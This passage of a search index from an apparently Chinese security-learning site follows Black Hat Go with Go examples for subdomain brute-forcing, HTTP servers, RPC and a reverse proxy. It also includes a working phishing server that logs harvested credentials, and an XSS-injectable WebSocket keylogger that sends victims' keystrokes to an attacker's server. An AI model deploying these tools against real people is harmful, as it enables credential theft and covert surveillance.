...","title":"FQDN"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/#subdomain_fuzzer","text":"\u53c2\u8003blackhat-go\u91ccsubdomain_guesser\u5199\u7684,\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e\u5b57\u5178\u901a\u8fc7dns\u67e5\u8be2\u7206\u7834\u5b50\u57df\u540d\u7684\u5de5\u5177,\u6838\u5fc3\u57fa\u672c\u4e00\u6837,\u4f46\u662f\u7531\u4e8e\u539f\u4f5c\u8005\u5199\u7684\u534f\u7a0b\u5e76\u53d1\u4ee3\u7801\u6709\u70b9\u96be\u4ee5\u7406\u89e3,\u6240\u4ee5\u7a0d\u5fae\u4fee\u6539\u4e86\u4e00\u4e0b,\u4f7f\u7528\u4e86 sizedwaitgroup \u8fd9\u4e2a\u5305 package main import ( \"bufio\" \"errors\" \"flag\" \"fmt\" \"os\" \"github.com/miekg/dns\" \"github.com/remeh/sizedwaitgroup\" ) // type Result struct { IpAddress string Hostname string } // func LookupA ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var ips [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeA ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return ips , err } if len ( in . Answer ) < 1 { return ips , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { ips = append ( ips , a . A . String ()) } } return ips , nil } func LookupCNAME ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var fqdns [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeCNAME ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return fqdns , err } if len ( in . Answer ) < 1 { return fqdns , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if c , ok := answer .( * dns . CNAME ); ok { fqdns = append ( fqdns , c . Target ) } } return fqdns , nil } // func Lookup ( fqdn , serverAddr string ) [] Result { var results [] Result var cfqdn = fqdn for { cnames , err := LookupCNAME ( cfqdn , serverAddr ) if err == nil && len ( cnames ) > 0 { cfqdn = cnames [ 0 ] continue } ips , err := LookupA ( cfqdn , serverAddr ) if err != nil { break } for _ , ip := range ips { results = append ( results , Result { IpAddress : ip , Hostname : fqdn , }) } break } return results } func worker ( fqdn string , serverAddr string , resultChannel chan [] Result , swg * sizedwaitgroup . SizedWaitGroup ) { results := Lookup ( fqdn , serverAddr ) if len ( results ) > 0 { resultChannel <- results } return } func main () { var ( flDomain = flag . String ( \"domain\" , \"\" , \"The domain to perform fuzzing against.\" ) flWordlist = flag . String ( \"wordlist\" , \"\" , \"The wordlist to use for fuzzing\" ) flWorkerCount = flag . Int ( \"c\" , 100 , \"The amount of worker to use\" ) flServerAddr = flag . String ( \"server\" , \"8.8.8.8:53\" , \"The DNS server to use\" ) ) flag . Parse () if * flDomain == \"\" || * flWordlist == \"\" { fmt . Println ( \"domain and wordlist are rquired\" ) os . Exit ( 1 ) } swg := sizedwaitgroup . New ( * flWorkerCount ) resultsChannel := make ( chan [] Result ) var results [] Result go func () { // ? read from channel immediately for r := range resultsChannel { for _ , result := range r { fmt . Printf ( \"%s\\t%s\\n\" , result . Hostname , result . IpAddress ) } results = append ( results , r ... ) swg . Done () } }() fh , err := os . Open ( * flWordlist ) if err != nil { fmt . Println ( \"Cannot read \" + * flWordlist ) os . Exit ( 2 ) } defer fh . Close () reader := bufio . NewReader ( fh ) for { bytes , _ , err := reader . ReadLine () line := string ( bytes [:]) if err != nil { break } swg . Add () go worker ( fmt . Sprintf ( \"%s.%s\" , line , * flDomain ), * flServerAddr , resultsChannel , & swg ) } swg . Wait () close ( resultsChannel ) fmt . Println ( \"\\nResult:\\n-----------------------------------------------\" ) for _ , r := range results { fmt . Printf ( \"%s\\t%s\\n\" , r . Hostname , r . IpAddress ) } }","title":"subdomain_fuzzer"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/","text":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668 # \u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668 # package main import ( \"fmt\" \"net/http\" ) func hello ( w http . ResponseWriter , r * http . Request ) { name := r . URL . Query (). Get ( \"name\" ) fmt . Fprintf ( w , \"Hello, %s\\n\" , name ) } func main () { http . HandleFunc ( \"/hello\" , hello ) http . ListenAndServe ( \":8000\" , nil ) } \u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668 # package main import ( \"fmt\" \"net/http\" \"strings\" ) type router struct { } func ( r * router ) ServeHTTP ( w http . ResponseWriter , req * http . Request ) { urlpath := req . URL . Path if strings . HasPrefix ( urlpath , \"/a\" ) { fmt . Fprint ( w , \"hello a\" ) } else if strings . HasPrefix ( urlpath , \"/b\" ) { fmt . Fprint ( w , \"hello b\" ) } else if strings . HasPrefix ( urlpath , \"/c\" ) { fmt . Fprint ( w , \"hello c\" ) } else { http . Error ( w , \"404 not found\" , 404 ) } } func main () { http . ListenAndServe ( \":8000\" , & router {}) } \u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6 # package main import ( \"fmt\" \"log\" \"net/http\" ) type logger struct { Inner http . Handler } func ( l * logger ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) l . Inner . ServeHTTP ( w , r ) log . Print ( \"end\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { f := http . HandlerFunc ( hello ) http . ListenAndServe ( \":8000\" , & logger { Inner : f }) } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u601d\u60f3. \u9996\u5148http.HandlerFunc\u7684\u5b9a\u4e49\u548c\u65b9\u6cd5\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230HandlerFunc\u5373 func(ResponseWriter, *Request) \u7684\u522b\u540d,\u5f53\u8c03\u7528ServeHTTP\u51fd\u6570\u7684\u65f6\u5019\u4f1a\u56de\u8c03\u8c03\u7528\u8be5\u51fd\u6570\u672c\u8eab,\u4ece\u800c\u8c03\u7528\u6211\u4eec\u4f8b\u5b50\u4e2d\u7684hello\u51fd\u6570 // The HandlerFunc type is an adapter to allow the use of // ordinary functions as HTTP handlers. If f is a function // with the appropriate signature, HandlerFunc(f) is a // Handler that calls f. type HandlerFunc func ( ResponseWriter , * Request ) // ServeHTTP calls f(w, r). func ( f HandlerFunc ) ServeHTTP ( w ResponseWriter , r * Request ) { f ( w , r ) } \u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u81ea\u5df1\u7684\u7ed3\u6784\u4f53logger,\u5305\u542b\u4e86\u4e00\u4e2aInner\u5c5e\u6027,\u7c7b\u578b\u4e3ahttp.Handler,\u800chttp.Handler\u7684\u5b9a\u4e49\u5982\u4e0b type Handler interface { ServeHTTP ( ResponseWriter , * Request ) } \u53ef\u4ee5\u770b\u5230\u662f\u4e00\u4e2a\u63a5\u53e3,\u53ea\u9700\u8981\u5b9e\u73b0\u4e86ServeHTTP\u8fd9\u4e2a\u65b9\u6cd5\u5373\u53ef,\u90a3\u4e48\u6211\u4eec\u7684HandlerFunc\u5c31\u80fd\u5145\u5f53Handler \u6700\u540e\u6211\u4eec\u5b9a\u4e49\u4e86logger\u7684ServeHTTP,\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u56de\u8c03hello\u8fd9\u4e2a\u51fd\u6570\u7684ServeHTTP,\u6700\u540e\u518d\u6267\u884c\u67d0\u4e9b\u8bed\u53e5,\u5b9e\u73b0\u4e86\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u7ed3\u6784 \u8c03\u7528\u94fe\u4e3a: ListenAndServe\u4f7f\u7528logger\u4f5c\u4e3a\u8def\u7531->logger.ServeHTTP->hello.ServeHTTP->hello \u7b2c\u4e09\u65b9\u5305:alice # Alice\u63d0\u4f9b\u4e86\u4e00\u79cd\u4fbf\u6377\u7684\u65b9\u5f0f\u6765\u94fe\u63a5\u60a8\u7684HTTP\u4e2d\u95f4\u4ef6\u529f\u80fd\u548c\u5e94\u7528\u7a0b\u5e8f\u5904\u7406\u7a0b\u5e8f\u3002 \u5982\u679c\u4f7f\u7528Alice\u6765\u6539\u5199\u4e0a\u9762\u7684\u4e2d\u95f4\u4ef6\u7684\u8bdd,\u4ee3\u7801\u4f1a\u53d8\u6210 package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) http . ListenAndServe ( \":8000\" , middleWare . Then ( http . HandlerFunc ( hello ))) } \u53ef\u4ee5\u770b\u5230alice\u5305\u7684\u4f5c\u7528\u5f88\u7b80\u5355,\u5e2e\u52a9\u6211\u4eec\u62fc\u63a5\u4e2d\u95f4\u4ef6,\u5728\u7ecf\u8fc7\u4e2d\u95f4\u4ef6\u8fc7\u540e\u518d\u6267\u884c\u6211\u4eec\u7684Handler \u7b2c\u4e09\u65b9\u5305:mux # \u7ed3\u5408\u4e86alice\u548cmux\u7684\u4e00\u4e2a\u7b80\u5355\u6d4b\u8bd5\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"fmt\" \"log\" \"net/http\" \"time\" \"github.com/gorilla/mux\" \"github.com/justinas/alice\" ) func logHandler ( h http . Handler ) http . Handler { return http . HandlerFunc ( func ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) h . ServeHTTP ( w , r ) log . Print ( \"end\" ) }) } func timeoutHandler ( h http . Handler ) http . Handler { return http . TimeoutHandler ( h , 1 * time . Second , \"timed out\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { value , ok := mux . Vars ( r )[ \"value\" ] w . WriteHeader ( http . StatusOK ) if ok { r . ParseForm () key := r . Form . Get ( \"key\" ) fmt . Fprintf ( w , \"key is %s, value is %s\\n\" , key , value ) } else { fmt . Fprintf ( w , \"hello\" ) } } func main () { middleWare := alice . New ( logHandler , timeoutHandler ) r := mux . NewRouter () s := r . PathPrefix ( \"/hello\" ). Subrouter () s . HandleFunc ( \"\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/\" , hello ). Methods ( \"GET\" ) s . HandleFunc ( \"/{value}\" , hello ). Methods ( \"POST\" ) http . ListenAndServe ( \":8000\" , middleWare . Then ( r )) } \u7b2c\u4e09\u65b9\u5305: Martini # Martini\u66f4\u50cf\u662f\u96c6\u6210\u4e86\u524d\u9762\u6240\u6709\u7684\u5305\u7684\u7b2c\u4e09\u65b9\u5305,\u4e0d\u4f7f\u7528\u539f\u751f\u7684net/http\u5305 \u5177\u4f53\u4f7f\u7528\u67e5\u770b \u8fd9\u91cc ,\u503c\u5f97\u4e00\u63d0\u7684\u662f\u53ef\u4ee5\u5728 \u8fd9\u91cc \u627e\u5230\u8fd9\u4e2a\u7b2c\u4e09\u65b9\u5305\u7684\u4e2d\u95f4\u4ef6 HTML\u6a21\u677f # golang\u4e2d\u81ea\u5e26\u6709html\u6a21\u677f\u7684\u5305: html/template ,\u4e00\u4e2a\u7b80\u5355\u7684\u4f7f\u7528\u5982\u4e0b package main import ( \"html/template\" \"net/http\" \"github.com/go-martini/martini\" ) type TemplateData struct { UserName string Password string } var x = `<html> <body> Hello {{.UserName}}. Your password is {{.Password}}. </body> </html>` func main () { m := martini . Classic () m . Get ( \"/\" , func () string { return \"Hello world!\" }) m . Get ( \"/hello/:UserName/:Password\" , func ( params martini . Params , w http . ResponseWriter ) { t , err := template . New ( \"hello\" ). Parse ( x ) if err != nil { w . WriteHeader ( 500 ) } td := TemplateData { UserName : params [ \"UserName\" ], Password : params [ \"Password\" ]} t . Execute ( w , td ) }) m . RunOnAddr ( \":8000\" ) } Credential Harvesting Attack(\u51ed\u8bc1\u6536\u96c6\u653b\u51fb) # \u5b9e\u9645\u4e0a\u5c31\u662f\u9493\u9c7c,\u6838\u5fc3\u601d\u60f3\u662f\u521b\u5efa\u514b\u9686\u7f51\u7ad9,\u6b3a\u9a97\u7528\u6237\u8f93\u5165\u5b83\u7684\u51ed\u8bc1\u5e76\u8bb0\u5f55 blackhat-go\u91cc\u7ed9\u4e86\u4e00\u4e2a \u793a\u4f8b \u8fd9\u91cc\u9700\u8981\u5c06\u4e0b\u8f7d\u4e0b\u6765\u7684public/index.html\u4e2d\u7684\u8868\u5355action\u6539\u4e3a\"/login\" \u7136\u540e\u4f7f\u7528golang\u6784\u5efa\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668\u7528\u4e8e\u7a83\u53d6\u51ed\u8bc1 package main import ( \"net/http\" \"os\" \"time\" \"github.com/gorilla/mux\" log \"github.com/sirupsen/logrus\" ) func login ( w http . ResponseWriter , r * http . Request ) { log . WithFields ( log . Fields { \"time\" : time . Now (). String (), \"username\" : r . FormValue ( \"_user\" ), \"password\" : r . FormValue ( \"_pass\" ), \"user-agent\" : r . UserAgent (), \"ip_address\" : r . RemoteAddr , }). Info ( \"login attempt\" ) http . Redirect ( w , r , \"/\" , 302 ) } func main () { fh , err := os . OpenFile ( \"credentials.txt\" , os . O_CREATE | os . O_APPEND | os . O_WRONLY , 0600 ) if err != nil { panic ( err ) } defer fh . Close () log . SetOutput ( fh ) r := mux . NewRouter () r . HandleFunc ( \"/login\" , login ). Methods ( \"POST\" ) r . PathPrefix ( \"/\" ). Handler ( http . FileServer ( http . Dir ( \"./public\" ))) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } \u8fd9\u91cc\u7528\u5230\u4e86http.FileServer\u548chttp.Dir,\u914d\u5408gorilla/mux,\u5c06public\u76ee\u5f55\u8bbe\u7f6e\u6210\u4e86web\u6839\u76ee\u5f55,\u51fd\u6570login\u7684\u4f5c\u7528\u5c31\u662f\u5c06\u7528\u6237post\u7684\u5185\u5bb9\u8bb0\u5f55\u5728\u65e5\u5fd7\u4e2d Keylogging With Websocket(\u4f7f\u7528Websocket\u7684\u952e\u76d8\u8bb0\u5f55\u5668) # \u653b\u51fb\u573a\u666f\u662f\u81ea\u5df1\u67b6\u8bbe\u4e86\u4e00\u4e2a\u670d\u52a1\u5668\u6216\u8005\u67d0\u4e2a\u670d\u52a1\u5668\u4e0a\u5b58\u5728XSS\u6f0f\u6d1e,\u8fd9\u65f6\u53ef\u4ee5\u901a\u8fc7\u63d2\u5165\u67d0\u6bb5\u6076\u610fJS\u4ee3\u7801,\u901a\u8fc7Websocket\u5c06\u7528\u6237\u7684\u4efb\u4f55\u8f93\u5165\u53d1\u9001\u56de\u653b\u51fb\u8005\u7684\u670d\u52a1\u5668 \u9996\u5148\u9700\u8981\u4e00\u4e2a\u6d4b\u8bd5\u73af\u5883,blackhat-go\u63a8\u8350\u4f7f\u7528 JSBIN \u4e00\u6bb5\u6d4b\u8bd5\u7528\u7684HTML\u4ee3\u7801 <!DOCTYPE html> < html > < head > < title > Login </ title > </ head > < body > < script src = 'http://localhost:8080/logger.js' ></ script > < form action = '/login' method = 'post' > < input name = 'username' /> < input name = 'password' /> < input type = \"submit\" /> </ form > </ body > </ html > \u4e00\u6bb5\u7b80\u5355\u7684\u5efa\u7acbwebsocket\u7684logger.js (Go\u6a21\u677f) ( function () { var conn = new WebSocket ( \"ws://{{.}}/ws\" ); document . onkeypress = keypress ; function keypress ( evt ) { s = String . fromCharCode ( evt . which ); conn . send ( s ); } })(); \u7136\u540e\u4e00\u4e2a\u7528\u4e8e\u63d0\u4f9blogger.js\u548c\u5904\u7406websocket\u7684\u670d\u52a1\u5668,\u8fd9\u91cc\u7528\u5230\u4e86 websocket \u7b2c\u4e09\u65b9\u5305 package main import ( \"flag\" \"fmt\" \"html/template\" \"log\" \"net/http\" \"github.com/gorilla/mux\" \"github.com/gorilla/websocket\" ) var ( upgrader = websocket . Upgrader { CheckOrigin : func ( r * http . Request ) bool { return true }, } listenAddr string wsAddr string jsTemplate * template . Template ) func init () { flag . StringVar ( & listenAddr , \"listen\" , \"\" , \"Address to listen on\" ) flag . StringVar ( & wsAddr , \"ws\" , \"\" , \"Address for WebSocket connection\" ) flag . Parse () var err error jsTemplate , err = template . ParseFiles ( \"logger.js\" ) if err != nil { panic ( err ) } } func serveWS ( w http . ResponseWriter , r * http . Request ) { conn , err := upgrader . Upgrade ( w , r , nil ) if err != nil { http . Error ( w , \"\" , 500 ) return } defer conn . Close () fmt . Printf ( \"Connection from %s\\n\" , conn . RemoteAddr (). String ()) for { _ , msg , err := conn . ReadMessage () if err != nil { return } fmt . Printf ( \"From %s: %s\\n\" , conn . RemoteAddr (). String (), string ( msg )) } } func serveLogger ( w http . ResponseWriter , r * http . Request ) { w . Header (). Set ( \"Content-Type\" , \"application/javascript\" ) jsTemplate . Execute ( w , wsAddr ) } func main () { r := mux . NewRouter () r . HandleFunc ( \"/ws\" , serveWS ) r . HandleFunc ( \"/logger.js\" , serveLogger ) fmt . Println ( \"test\" , wsAddr ) log . Fatal ( http . ListenAndServe ( \":8080\" , r )) } websocket\u8fd8\u662f\u5f88\u597d\u73a9\u7684,\u5b9e\u9645\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 Reverse Proxy(\u53cd\u5411\u4ee3\u7406) # golang\u81ea\u5e26\u7684httputil\u5305\u4e2d\u5b58\u5728ReverseProxy\u7684\u5b9e\u73b0,\u4e00\u4e2a\u7b80\u5355\u7684\u53cd\u5411\u4ee3\u7406\u5982\u4e0b package main import ( \"log\" \"net/http\" \"net/http/httputil\" \"net/url\" ) func main () { // \u5c06 http://127.0.0.1:8888/ \u53cd\u5411\u4ee3\u7406\u5230 http://127.0.0.1:80/ targetUrlString := \"http://127.0.0.1:80/\" targetUrl , err := url . Parse ( targetUrlString ) if err != nil { log . Fatal ( \"err\" ) } proxy := httputil . NewSingleHostReverseProxy ( targetUrl ) log . Println ( \"Reverse proxy server at 127.0.0.1:8888\" ) if err := http . ListenAndServe ( \":8888\" , proxy ); err != nil { log . Fatalln ( \"Error:\" , err ) } } \u7b80\u5355\u7684RPC\u670d\u52a1\u5668 # \u53c2\u8003\u6587\u7ae0: Go\u5b98\u65b9\u5e93RPC\u5f00\u53d1\u6307\u5357 \u4f7f\u7528golang\u4e2d\u81ea\u5e26\u7684 net/rpc \u5305\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684rpc\u670d\u52a1\u5668(\u53ef\u4ee5\u7528\u4e8e\u5b9e\u73b0\u7c7b\u4f3c\u52a8\u6001\u5bfc\u5165\u7684\u529f\u80fd) \u9996\u5148\u5b9a\u4e49\u4e00\u4e2a rpc_client.go package rpc_server import ( \"errors\" \"log\" \"net\" \"net/http\" \"net/rpc\" ) type Args struct { // \u4f20\u5165\u53c2\u6570\u7ed3\u6784 A , B int } // \u8fd4\u56de\u53c2\u6570\u7ed3\u6784 type Quotient struct { Quo , Rem int } // rpc\u670d\u52a1\u5668\u8981\u5b9e\u73b0\u7684\u63a5\u53e3 type ServiceInterface interface { Multiply ( args * Args , reply * int ) error Divide ( args * Args , quo * Quotient ) error } // \u7a7a\u7684\u7ed3\u6784,\u7528\u4e8e\u5b9e\u73b0rpc\u670d\u52a1\u5668\u63a5\u53e3 type Service struct { } // \u5b9e\u73b0Multiply\u65b9\u6cd5 func ( ss * Service ) Multiply ( args * Args , reply * int ) error { * reply = args . A * args . B return nil } // \u5b9e\u73b0Divide\u65b9\u6cd5 func ( ss * Service ) Divide ( args * Args , quo * Quotient ) error { if args . B == 0 { return errors . New ( \"Divide by zero\" ) } quo . Quo = args . A / args . B quo . Rem = args . A % args . B return nil } // \u5f00\u59cb\u76d1\u542c\u7aef\u53e3,\u5904\u7406\u8fde\u63a5 func Start () { s := new ( Service ) rpc . Register ( s ) rpc . HandleHTTP () l , e := net . Listen ( \"tcp\" , \":8888\" ) if e != nil { log . Fatal ( \"listen error:\" , e ) } go http . Serve ( l , nil ) } \u7136\u540e\u7f16\u5199 rpc_client.go package rpc_client import ( \"fmt\" \"learn/rpc_server\" \"log\" \"net/rpc\" ) const ServiceName = \"Service\" // \u8fde\u63a5\u5230rpc\u670d\u52a1\u5668\u5e76\u4e14\u8fdc\u7a0b\u8c03\u7528Multiply\u65b9\u6cd5 func Connect ( address string ) { client , err := rpc . DialHTTP ( \"tcp\" , address ) if err != nil { log . Fatal ( \"Dial error:\" , err ) } args := & rpc_server . Args { A : 7 , B : 8 } var reply int err = client . Call ( ServiceName + \".Multiply\" , args , & reply ) if err != nil { log . Fatal ( \"Error:\" , err ) } fmt . Printf ( \"Multiply: %d*%d=%d\" , args . A , args . B , reply ) } \u6700\u540e\u7f16\u5199\u4e00\u4e2amain.go\u505a\u6d4b\u8bd5 package main import ( \"learn/rpc_client\" \"learn/rpc_server\" \"time\" ) func main () { rpc_server . Start () time . Sleep ( 1 * time . Second ) rpc_client . Connect ( \"127.0.0.1:8888\" ) } \u5b9e\u73b0\u6548\u679c\u5982\u4e0b \u8f6c\u79fb\u7b14\u8bb0\u7684\u65f6\u5019\u56fe\u5f04\u4e22\u4e86\uff0c\u5404\u4f4d\u5e08\u5085\u4eec\u8bf7\u81ea\u5df1\u624b\u52a8\u6d4b\u8bd5\u4e0b\u4ee3\u7801\u5427 \u7136\u800cgolang\u4e2d\u81ea\u5e26\u7684net/rpc\u5305\u5b58\u5728\u67d0\u4e9b\u7f3a\u70b9,\u5982: (\u53c2\u8003\u6587\u7ae0: Golang\u6807\u51c6\u5e93RPC\u5b9e\u8df5\u53ca\u6539\u8fdb ) \u5f53\u96c6\u7fa4\u673a\u5668\u589e\u52a0\u5230\u4e00\u5b9a\u6570\u91cf,\u8bf7\u6c42\u91cf\u53d8\u5927\u65f6,\u4f1a\u51fa\u73b0\u5f88\u591a\u4efb\u52a1\u5361\u4f4f\u6ca1\u6709\u54cd\u5e94\u7684\u60c5\u51b5,\u53ef\u4ee5\u8f6c\u7528tcp\u5b9e\u73b0rpc\u670d\u52a1\u5668\u89e3\u51b3 rpc\u5305\u91cc\u7684rpc.Dial\u51fd\u6570\u6ca1\u6709timeout, \u7cfb\u7edf\u9ed8\u8ba4\u662f\u6ca1\u6709timeout\u7684,\u6240\u4ee5\u5728\u8fd9\u91cc\u53ef\u80fd\u5361\u4f4f.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u91c7\u7528net\u5305\u91cc\u7684 net.DialTimeout\u51fd\u6570 rpc\u5305\u91cc\u9ed8\u8ba4\u4f7f\u7528gobCodec\u6765\u7f16\u7801\u89e3\u7801, \u8fd9\u91ccio\u53ef\u80fd\u4f1a\u5361\u4f4f\u800c\u4e0d\u8fd4\u56de\u9519\u8bef,\u6240\u4ee5\u6211\u4eec\u8981\u81ea\u5df1\u7f16\u5199\u52a0\u5165timeout\u7684codec. \u6ce8\u610fserver\u8fd9\u8fb9\u8bfb\u5199\u90fd\u6709timeout,\u4f46\u662fclient\u8fd9\u8fb9\u53ea\u6709\u5199\u6709timeout,\u56e0\u4e3a\u8bfb\u7684\u8bdd\u5e76\u4e0d\u80fd\u9884\u77e5\u4efb\u52a1\u5b8c\u6210\u7684\u65f6\u95f4 \u53ef\u4ee5\u5b66\u4e60\u4e0b rpcx \u597d\u50cf\u4f7f\u7528\u8d77\u6765\u66f4\u52a0\u7b80\u5355,\u800c\u4e14features\u4e5f\u5f88\u591a \u4e00\u4e2a\u7b80\u5355\u7684\u670d\u52a1\u5668\u5982\u4e0b package main import ( \"context\" \"flag\" \"fmt\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/server\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) type Arith struct {} // the second parameter is not a pointer func ( t * Arith ) Mul ( ctx context . Context , args example . Args , reply * example . Reply ) error { reply . C = args . A * args . B fmt . Println ( \"C=\" , reply . C ) return nil } func main () { flag . Parse () s := server . NewServer () //s.Register(new(Arith), \"\") s . RegisterName ( \"Arith\" , new ( Arith ), \"\" ) err := s . Serve ( \"tcp\" , * addr ) if err != nil { panic ( err ) } } \u4e00\u4e2a\u7b80\u5355\u7684\u5ba2\u6237\u7aef\u5982\u4e0b,\u8fd9\u91cc\u503c\u5f97\u6ce8\u610f\u7684\u662f\u6839\u636egithub\u7684Readme\u6240\u8bf4,\u56e0\u4e3arpcx\u4f9d\u8d56\u4e8eetcd,\u800cetcd\u5728go mods\u91cc\u4f7f\u7528\u5b58\u5728\u95ee\u9898,\u6240\u4ee5\u9700\u8981\u5728go.mod\u4e2d\u6dfb\u52a0 replace google.golang.org/grpc => google.golang.org/grpc v1.29.0 package main import ( \"context\" \"flag\" \"log\" \"github.com/smallnest/rpcx/protocol\" example \"github.com/rpcxio/rpcx-examples\" \"github.com/smallnest/rpcx/client\" ) var ( addr = flag . String ( \"addr\" , \"localhost:8888\" , \"server address\" ) ) func main () { flag . Parse () d := client . NewPeer2PeerDiscovery ( \"tcp@\" +* addr , \"\" ) opt := client . DefaultOption opt . SerializeType = protocol . JSON xclient := client . NewXClient ( \"Arith\" , client . Failtry , client . RandomSelect , d , opt ) defer xclient . Close () args := example . Args { A : 10 , B : 20 , } reply := & example . Reply {} err := xclient . Call ( context . Background (), \"Mul\" , args , reply ) if err != nil { log . Fatalf ( \"failed to call: %v\" , err ) } log . Printf ( \"%d * %d = %d\" , args . A , args . B , reply . C ) } \u53ef\u4ee5\u770b\u5230\u63a5\u6536\u53c2\u6570\u548c\u8fd4\u56de\u53c2\u6570\u7684\u5b9a\u4e49\u90fd\u5b58\u5728\u4e86 github.com/rpcxio/rpcx-examples \u91cc,\u5230\u65f6\u5019\u8981\u81ea\u5df1\u7f16\u5199\u7684\u8bdd\u53ef\u4ee5\u81ea\u5df1\u63d0\u524d\u5199\u597d\u4e22\u5230github\u4e0a \u53ef\u4ee5\u5b66\u4e60\u4e0b grpc-go (\u4f3c\u4e4e\u6982\u5ff5\u6bd4\u8f83\u591a \u6682\u65f6\u5495\u4e86)","title":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u7b2c\u56db\u7ae0-http\u670d\u52a1\u5668","text":"","title":"\u7b2c\u56db\u7ae0-HTTP\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668","text":"package main import ( \"fmt\" \"net/http\" ) func hello ( w http . ResponseWriter , r * http . Request ) { name := r . URL . Query (). Get ( \"name\" ) fmt . Fprintf ( w , \"Hello, %s\\n\" , name ) } func main () { http . HandleFunc ( \"/hello\" , hello ) http . ListenAndServe ( \":8000\" , nil ) }","title":"\u4e00\u4e2a\u7b80\u5355\u7684http\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668","text":"package main import ( \"fmt\" \"net/http\" \"strings\" ) type router struct { } func ( r * router ) ServeHTTP ( w http . ResponseWriter , req * http . Request ) { urlpath := req . URL . Path if strings . HasPrefix ( urlpath , \"/a\" ) { fmt . Fprint ( w , \"hello a\" ) } else if strings . HasPrefix ( urlpath , \"/b\" ) { fmt . Fprint ( w , \"hello b\" ) } else if strings . HasPrefix ( urlpath , \"/c\" ) { fmt . Fprint ( w , \"hello c\" ) } else { http . Error ( w , \"404 not found\" , 404 ) } } func main () { http . ListenAndServe ( \":8000\" , & router {}) }","title":"\u4f7f\u7528\u52a8\u6001\u8def\u7531\u7684\u670d\u52a1\u5668"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E5%9B%9B%E7%AB%A0-HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8/#\u4e00\u4e2a\u7b80\u5355\u7684\u4e2d\u95f4\u4ef6","text":"package main import ( \"fmt\" \"log\" \"net/http\" ) type logger struct { Inner http . Handler } func ( l * logger ) ServeHTTP ( w http . ResponseWriter , r * http . Request ) { log . Print ( \"start\" ) l . Inner . ServeHTTP ( w , r ) log . Print ( \"end\" ) } func hello ( w http . ResponseWriter , r * http . Request ) { fmt . Fprint ( w , \"hello\\n\" ) } func main () { f := http . HandlerFunc ( hello ) http . ListenAndServe ( \":8000\" , & logger { Inner : f }) } \u8fd9\u91cc\u5b9e\u73b0\u4e86\u4e00\u79cd\u7c7b\u4f3c\u4e8e\u88c5\u9970\u5668\u7684\u601d\u60f3. \u9996\u5148http.HandlerFunc\u7684\u5b9a\u4e49\u548c\u65b9\u6cd5\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230HandlerFunc\u5373 func(ResponseWriter, *Request) 